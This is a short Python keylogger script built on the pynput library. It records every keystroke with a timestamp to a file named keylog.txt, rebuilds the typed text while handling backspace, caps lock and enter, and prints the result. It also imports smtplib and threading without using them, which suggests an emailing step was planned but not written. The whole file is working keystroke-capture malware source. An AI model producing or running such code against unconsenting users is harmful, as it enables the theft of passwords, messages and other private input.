#!/usr/bin/python3

import datetime
from fileinput import filename
import smtplib
import threading
from unittest.util import three_way_cmp
import pynput.keyboard as keyboard
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

log = ""
caps = False
count = 0
def grab_keys(key):
    logging.info(str(key))
    global log,caps,count
    # case = False
    try:

        if caps: 
            log=log+str(key.char).swapcase()
        else:
            log=log+str(key.char)
        
    
    except Exception:
        if str(key) == 'Key.space':
            log +=" "

        elif str(key) == 'Key.shift':
            pass

        elif str(key)=='Key.backspace':
            log=log[:-1]

        elif str(key)=='Key.caps_lock':
            caps = True
            count+=1
            if count > 1:
                count= 0
                caps=False

        elif str(key)=='Key.enter':
            log+='\n'

        elif str(key) == "Key.esc":
            return False
        else:
            log+= " " + str(key)+ " "
    prt= print (log)



listener=keyboard.Listener(on_press=grab_keys)

with listener:
	
    listener.join()
